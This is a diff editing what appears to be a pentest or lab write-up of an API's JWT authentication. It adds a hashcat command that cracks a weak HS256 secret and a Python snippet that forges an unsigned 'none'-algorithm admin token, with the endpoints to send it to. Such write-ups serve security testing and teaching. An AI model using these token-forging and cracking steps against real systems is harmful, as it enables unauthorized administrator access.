@@ -298,7 +298,7 @@ Connection: close
 }
 ```
 
-It is observed that the server does not bypass signature validation. However, by successfully cracking the signature, access as the administrator is achieved.
+For an HS256 token the server verifies the signature, so a token re-signed with the wrong key is rejected (the 401 above). The secret is weak and crackable, and the server additionally accepts the `none` algorithm (see the bypass below), which skips signature verification entirely.
 
 ```bash
 maxgarci@maxgarci-Ubuntu:/usr/share/wordlists/SecLists$ hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjhmOWZkNzA5NjE2YjQ3NzExZDZhMGQ2IiwiaWF0IjoxNzYxMjkxNTk5LCJleHAiOjE3NjEzNzc5OTl9.otACZTMRSFUbgj3oS_pvMvC58EFmWM4KlQFIx615mbQ" ./Passwords/scraped-JWT-secrets.txt --show
@@ -306,6 +306,20 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjhmOWZkNzA5NjE2YjQ3NzExZDZ
 ```
 
 Using the newly generated token, authentication as the administrator is possible, granting access to privileged functions such as changing user roles.
+
+### Bypass: the `none` algorithm (no cracking needed)
+
+> **IN PROGRESS**
+
+The token validator also honors the `none` algorithm, so the signature step can be skipped entirely. The server enables it in `config.py` (`JWT_ALLOW_NONE_ALGORITHM=True`), and when a token header declares `alg: none` the validator decodes it with signature verification disabled. An attacker forges an admin token with no signature and no knowledge of the secret:
+
+```python
+import jwt
+# admin user_id leaked via /api/messages, /api/system/logs or /api/v1/userinfo
+tok = jwt.encode({'user_id': '<ADMIN_ID>'}, key='', algorithm='none')
+```
+
+Send `tok` as the `X-Auth-Token` header to any JWT-gated endpoint (for example `/api/cameras` or `/admin/roles`) and the server treats the request as the admin, with no signature required. This is the fastest path to administrator, the hashcat crack above is only needed if the `none` algorithm is later disabled.
 
 ![[api2_admin_access.png]]
 
